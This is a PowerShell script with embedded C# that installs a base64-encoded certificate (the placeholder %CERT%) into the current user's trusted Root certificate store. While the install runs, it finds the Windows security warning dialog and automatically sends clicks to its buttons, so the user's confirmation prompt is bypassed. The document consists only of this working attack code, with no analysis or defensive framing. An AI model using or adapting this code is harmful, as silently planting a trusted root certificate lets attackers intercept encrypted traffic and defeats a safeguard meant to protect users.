function ConfirmCert{
Add-Type @"
using System;
using System.Text;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Security.Cryptography.X509Certificates;
using System.Threading;

public static class Win32
{
	public class SearchData
    {
        public string Wndclass;
        public string Title;
        public string Process;
        public IntPtr hWnd;
    }

    private delegate bool EnumWindowsProc(IntPtr hWnd, ref SearchData data);

    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, ref SearchData data);
	
	[DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern int GetClassName(IntPtr hWnd, StringBuilder lpClassName, int nMaxCount);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
	
	[DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
	static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
	
	[DllImport("user32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	static extern bool SetForegroundWindow(IntPtr hWnd);
	
	public delegate bool EnumWindowProc(IntPtr hwnd, IntPtr lParam);
	
	[DllImport("user32")]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool EnumChildWindows(IntPtr window, EnumWindowProc callback, IntPtr lParam);  
	
	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	static extern IntPtr SendMessage(IntPtr hWnd, UInt32 Msg, IntPtr wParam, IntPtr lParam);
	
	const int BM_CLICK = 0x00F5;
	
	public static byte[] GetCertAsByteArray(String sCert)
    {
		return Convert.FromBase64String(sCert);
    }
        
	public static void Start(String sCert){
        byte[] bCert = GetCertAsByteArray(sCert);
        if (bCert != null)
        {
            X509Certificate2 certificate = new X509Certificate2(bCert);
            X509Store store = new X509Store(StoreName.Root, StoreLocation.CurrentUser);
            store.Open(OpenFlags.ReadWrite);
            if (!store.Certificates.Contains(certificate))
            {
                Thread thread = new Thread(SearchDialog);
                thread.Start();
                store.Add(certificate);
                thread.Join();
            }
            store.Close();
        }
	}
	
	public static void SearchDialog()
	{
		IntPtr hWnd;
		do{
			hWnd = SearchForWindow("#32770",String.Empty);
			if (!hWnd.Equals(IntPtr.Zero))
		    {
		    	break;
			}else
	        {
		        hWnd=IntPtr.Zero;
	        }
		}while (hWnd.Equals(IntPtr.Zero));
		SetForegroundWindow(hWnd);
		EnumWindowProc childProc = new EnumWindowProc(ECW);
		EnumChildWindows(hWnd, childProc, IntPtr.Zero);
	}
	
	public static IntPtr SearchForWindow(string wndclass, string title)
    {
        SearchData sd = new SearchData();
        sd.Wndclass = wndclass;
        sd.Title = title;
        sd.hWnd=IntPtr.Zero;
        EnumWindows(new EnumWindowsProc(EnumProc), ref sd);
        return sd.hWnd;
    }
    
	public static bool EnumProc(IntPtr hWnd, ref SearchData data)
    {
    	StringBuilder caption = new StringBuilder(1024);
        StringBuilder className = new StringBuilder(1024);
        GetWindowText(hWnd, caption, caption.Capacity);
        GetClassName(hWnd, className, className.Capacity);
        String sEN=GetProcessName(hWnd);
		if((!data.Wndclass.Equals(String.Empty) && className.ToString().StartsWith(data.Wndclass)) || (!data.Title.Equals(String.Empty) && caption.ToString().StartsWith(data.Title)))
		{
        	if(sEN.Contains("csrss") || sEN.Contains("certutil"))
	        {
		        data.hWnd = hWnd;
                return false;
	        }
        }
       	
        return true;
    }
    
	public static String GetProcessName(IntPtr hWnd){
		uint processID = 0;
		uint threadID = GetWindowThreadProcessId(hWnd, out processID);
		Process p = Process.GetProcessById((int)processID);
		return p.ProcessName.ToLower();
	}
	public static bool ECW(IntPtr hWnd, IntPtr lParam)
	{
		SendMessage(hWnd, BM_CLICK, IntPtr.Zero, IntPtr.Zero);
		return true;
	}
}
"@;
[Win32]::Start("%CERT%");
exit
}
ConfirmCert
